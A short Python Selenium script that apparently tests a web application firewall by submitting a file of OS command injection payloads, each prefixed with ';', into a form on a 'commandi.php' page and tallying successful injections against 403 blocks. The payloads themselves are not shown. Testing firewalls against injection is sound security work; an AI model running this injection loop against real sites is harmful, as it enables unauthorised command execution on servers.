from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException


def execute(driver, target_url):
    # Start to attack
    os_injection_attack(driver, target_url)


def os_injection_attack(driver, target_url):
    print(f"[+] Running OS Injection Attacks")
    attack_url_page = "commandi.php"  # OS Command Injection
    success_counter = 0
    blocked_by_waf_counter = 0
    length_of_payload_file = 0

    with open("Payloads/OS_Injection.txt", 'r', encoding='latin-1') as payload_list:
        for payload in payload_list.read().splitlines():
            length_of_payload_file += 1
            try:
                # Load page
                driver.get(target_url + attack_url_page)
                # Send payload
                driver.find_element_by_id("target").clear()
                driver.find_element_by_id("target").send_keys(";"+payload, Keys.RETURN)
                # Look for success
                att = driver.find_element_by_xpath("//div[@id='main']/p[@align='left']").text
                if att != "":
                    if "Server: 127.0.0.53" not in att:
                        success_counter += 1
            except NoSuchElementException:
                try:
                    # Catch WAF Blocking page
                    waf_block_message = driver.find_element_by_xpath("/html/body/center/h1").text
                    if "403 Forbidden" == waf_block_message:
                        blocked_by_waf_counter +=1
                except NoSuchElementException:
                    pass

        print(f"\n[!] ~~~OS Injection Results~~~ [!]")
        print(f"[+] Total Successful Attacks:", success_counter)
        print(f"[+] Total Blocked By WAF:", blocked_by_waf_counter)
        print(f"[+] Total Failed Attacks:", length_of_payload_file - blocked_by_waf_counter - success_counter)